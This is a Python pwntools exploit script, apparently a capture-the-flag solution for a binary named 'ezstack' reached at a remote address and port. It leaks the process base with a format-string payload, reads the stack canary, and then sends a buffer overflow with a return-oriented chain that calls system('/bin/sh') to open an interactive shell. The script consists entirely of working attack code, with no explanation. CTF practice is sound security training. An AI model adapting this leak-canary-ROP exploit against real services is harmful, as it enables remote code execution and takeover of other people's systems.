#coding:utf-8
from pwn import *

context.log_level='debug'
#context.terminal=['tmux','splitw','-h']


#p = process('./ezstack')
p = remote('47.108.195.119','20113')
p.recv()
p.sendline(b'摸几只鱼')
p.recv()
p.sendline('Gl0w')
#attach(p,'b *$rebase(0x0000000000000A7B)')
#---leak


payload = 'BBBB-%17$p'.ljust(0x20-0x8,'a')

p.sendline(payload)

p.recvuntil('BBBB-')
# libc_start_main = int(p.recv(len('0x7fffffffdf18')),16)#- 243
# print "[+]libc_start_main=>"+hex(libc_start_main)

# p.recvuntil('-')
process_base = int(p.recv(len('0x555555400860')),16) - 0x9DC
print "process_base=>"+hex(process_base)
pause()

p.recvuntil('a\n')
canary = u64(p.recv(7).rjust(8,'\x00'))
print hex(canary)
pause()

pop_rdi_ret = 0x0000000000000b03 + process_base
system = process_base + 0x810
binsh = process_base + 0xB24
ret = process_base + 0x00000000000007c1

payload = 'a'*(0x20-0x8) + p64(canary) + 'junkjunk' + p64(ret) + p64(pop_rdi_ret) + p64(binsh) + p64(system)

p.sendline(payload)

p.interactive()
#07:0038│         0x7fffffffdf18 —▸ 0x7ffff7dea0b3 (__libc_start_main+243) ◂— mov    edi, eax



